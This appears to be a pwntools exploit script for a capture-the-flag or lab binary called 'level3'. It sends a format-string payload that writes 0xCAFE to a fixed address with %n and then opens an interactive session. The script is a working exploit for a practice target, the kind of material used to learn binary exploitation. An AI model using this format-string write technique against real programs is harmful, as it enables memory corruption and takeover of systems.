#!/usr/bin/env python3
import argparse

from pwn import *

# setting 
context.arch = 'i386'
context.os = 'linux'
context.endian = 'little'
context.word_size = 32
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.log_level = 'INFO'


def wait_for_prompt(r):
    print(r.recvuntil(b"Your choice :"))
    # r.recvuntil(b"Your choice :")


# --------------------------------------------------------------------------
if __name__ == "__main__":

    parser = argparse.ArgumentParser(description='Exploit the bins.')
    parser.add_argument('--dbg', '-d', action="store_true")
    parser.add_argument('--remote', '-r', action="store_true")
    args = parser.parse_args()

    remote_server = '192.168.8.16'

    if args.remote:
        r = remote(remote_server, 4013)
    else:
        r = process('./level3')

    if args.dbg:
        gdb.attach(r, """
    vmmap
    b *main+99
    """)

    # ------------------------------------------------------------------------
    # Known Addresses
    BSS_BASE = 0x804b000
    GLOBAL_FLAG = 0

    # ------------------------------------------------------------------------

    print(r.recvuntil(b"Give me something to say!"))
    r.clean()

    payload = b''
    payload += p32(0x804a04c)
    # payload += p32(0xAAAAAAAA)
    # payload += b'%11$p'
    payload += f'%{int(0xCAFE - 4)}c%11$n'.encode()

    r.sendline(payload)

    # Drop to interactive console
    r.interactive()
